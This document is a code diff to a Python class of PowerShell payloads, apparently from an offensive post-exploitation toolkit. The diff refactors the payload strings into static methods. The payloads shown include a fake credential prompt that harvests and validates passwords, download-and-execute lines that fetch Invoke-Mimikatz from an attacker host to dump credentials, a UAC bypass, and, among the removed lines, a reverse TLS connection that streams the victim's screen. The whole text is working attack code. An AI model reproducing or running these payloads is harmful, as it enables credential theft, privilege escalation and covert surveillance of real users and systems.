@@ -183,43 +183,31 @@ class SHELLCODE(object):
                 customshell += buildstr
         return customshell
 
+    @staticmethod
+    def windows_ps_ask_creds_tcp():
+        return (
+            "$ErrorActionPreference=\'SilentlyContinue\';Add-Type -assemblyname system.DirectoryServices.accountmanagement;"
+            "$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine);"
+            "$domainDN = \'LDAP://\' + ([ADSI]\'\').distinguishedName;"
+            "$credential = $host.ui.PromptForCredential(\'Credentials are required to perform this operation!\', \'\', \'\', \'\');"
+            "if($credential){$creds = $credential.GetNetworkCredential();$user = $creds.username;$pass = $creds.password;"
+            "echo \' INCORRECT:\'$user\':\'$pass;"
+            "$authlocal = $DS.ValidateCredentials($user, $pass);"
+            "$authdomain = New-Object System.DirectoryServices.DirectoryEntry($domainDN,$user,$pass);"
+            "if(($authlocal -eq $true) -or ($authdomain.name -ne $null)){"
+            "echo \' CORRECT:\'$user\':\'$pass}}")
 
+    @staticmethod
+    def windows_invoke_mimikatz():
+        return (
+            "IEX (New-Object Net.WebClient).DownloadString(\\\"http://%s:%s/Invoke-Mimikatz.ps1\\\");"
+            "Invoke-Mimikatz -DumpCreds")
 
-    windows_ps_rev_watch_screen = (
-        "Try{Add-Type -AssemblyName System.Windows.Forms;[System.IO.MemoryStream] $MemoryStream = New-Object System.IO.MemoryStream;"
-        "$client = New-Object System.Net.Sockets.TCPClient('%s','%s');$stream = $client.GetStream();"
-        "$ssl = New-Object System.Net.Security.SslStream $stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]);"
-        "$ssl.AuthenticateAsClient($env:computername);Start-Sleep -s 1;function SendResponse($sock, $string){$bytesSent = $sock.Write($string)};"
-        "function SendStrResponse($sock, $string){$bytesSent = $sock.Write([text.Encoding]::Ascii.GetBytes($string))};"
-        "function SendHeader($sock,$length,$statusCode = \"200 OK\",$mimeHeader=\"text/html\",$httpVersion=\"HTTP/1.1\"){$response = \"HTTP/1.1 $statusCode`r`n\" + \"Content-Type: multipart/x-mixed-replace; boundary=--boundary`r`n`n\";"
-        "SendStrResponse $sock $response;}SendHeader $ssl;"
-        "While ($client.Connected){$b = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);"
-        "$g = [System.Drawing.Graphics]::FromImage($b);"
-        "$g.CopyFromScreen((New-Object System.Drawing.Point(0,0)), (New-Object System.Drawing.Point(0,0)), $b.Size);"
-        "$g.Dispose();$MemoryStream.SetLength(0);$b.Save($MemoryStream, ([system.drawing.imaging.imageformat]::jpeg));"
-        "$b.Dispose();$length = $MemoryStream.Length;[byte[]] $Bytes = $MemoryStream.ToArray();"
-        "$str = \"`n`n--boundary`n\" + \"Content-Type: image/jpeg`n\" + \"Content-Length: $length`n`n\";"
-        "SendStrResponse $ssl $str;SendResponse $ssl $Bytes};$MemoryStream.Close()}catch{Exit}")
-
-    windows_ps_ask_creds_tcp = (
-        "$ErrorActionPreference=\'SilentlyContinue\';Add-Type -assemblyname system.DirectoryServices.accountmanagement;"
-        "$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine);"
-        "$domainDN = \'LDAP://\' + ([ADSI]\'\').distinguishedName;"
-        "$credential = $host.ui.PromptForCredential(\'Credentials are required to perform this operation!\', \'\', \'\', \'\');"
-        "if($credential){$creds = $credential.GetNetworkCredential();$user = $creds.username;$pass = $creds.password;"
-        "echo \' INCORRECT:\'$user\':\'$pass;"
-        "$authlocal = $DS.ValidateCredentials($user, $pass);"
-        "$authdomain = New-Object System.DirectoryServices.DirectoryEntry($domainDN,$user,$pass);"
-        "if(($authlocal -eq $true) -or ($authdomain.name -ne $null)){"
-        "echo \' CORRECT:\'$user\':\'$pass}}")
-
-    windows_invoke_mimikatz = (
-        "IEX (New-Object Net.WebClient).DownloadString(\\\"http://%s:%s/Invoke-Mimikatz.ps1\\\");"
-        "Invoke-Mimikatz -DumpCreds")
-
-    windows_uac_bypass = (
-        "IEX (New-Object Net.WebClient).DownloadString(\\\"http://%s:%s/Invoke-SilentCleanUpBypass.ps1\\\");"
-        "Invoke-SilentCleanUpBypass -Command \\\"powershell.exe -c %s\\\"")
+    @staticmethod
+    def windows_uac_bypass():
+        return (
+            "IEX (New-Object Net.WebClient).DownloadString(\\\"http://%s:%s/Invoke-SilentCleanUpBypass.ps1\\\");"
+            "Invoke-SilentCleanUpBypass -Command \\\"powershell.exe -c %s\\\"")
 
 
     injectwindows = """
